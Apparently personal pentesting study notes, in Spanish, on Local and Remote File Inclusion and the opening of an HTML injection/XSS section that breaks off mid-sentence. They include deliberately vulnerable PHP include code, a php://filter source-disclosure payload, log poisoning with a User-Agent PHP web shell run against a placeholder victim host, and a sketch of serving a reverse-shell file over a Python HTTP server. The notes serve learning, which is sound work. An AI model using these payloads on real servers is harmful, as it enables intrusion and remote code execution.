#### Vulnerabilidades

### Local File Inclusion // Inclusion de Archivos Local

Vulnerabilidad que permite a un atacante poder acceder a archivos locales de la raiz del servidor o dispositivo

##  Ejemplo 1: LFI directo (`/etc/passwd`)

```php
<?php
// vulnerable.php
if (isset($_GET['page'])) {
    include($_GET['page']);
} else {
    echo "No page specified.";
}

```
## Ejemplo 2: LFI con path traversal (../../../../../etc/passwd)
```php
<?php
// vulnerable.php
$page = $_GET['page'] ?? 'default.php';
include("pages/" . $page);
```

como ver codigo fuente sin ejecutar ?page=php://filter/convert.base64-encode/resource=index.php

como pasar de lfi a rce con log poisoning
hacia /var/log/apache2/access.log
se puede ejecutar codigo enviando cabeceras como <?php echo "buenas"; ?> ya sea del referer, user agent, etc.
entonces si inyectas User-Agent: <?php system($_GET["cmd"]); ?>
puedes ejecutar codigo de esta manera http://victima.com/index.php?page=/var/log/apache2/access.log&cmd=id
 Requisitos para que funcione

    Que el servidor use LFI sin sanitizar (include($_GET["page"]))

    Que los logs no estén protegidos (no haya open_basedir, disable_functions, etc.)

    Que PHP esté mal configurado y no restrinja la ejecución de archivos externos

    Que los logs se escriban en texto plano y no estén rotados o comprimidos

### Remote File Inclusion

Es bajar un archivo desde un servidor donde esta la maquina del atacante un ejemplo seria wordpress con gwole 
haces un archivo malicioso .php para sacar una reverse shell 
puedes hacer un servidor http desde python -m http.server [puerto] 
y con eso ya dependiendo como sea el exploit pasar tu archivo mediante tu http server

### HTML Injection y  XSS (cross-site scripting)

Este consiste de poder inyectar codigo html como <h1>Buenas</h1> y si sale grande buenas entonces se puede hacer un html Injection o de otra maneta 
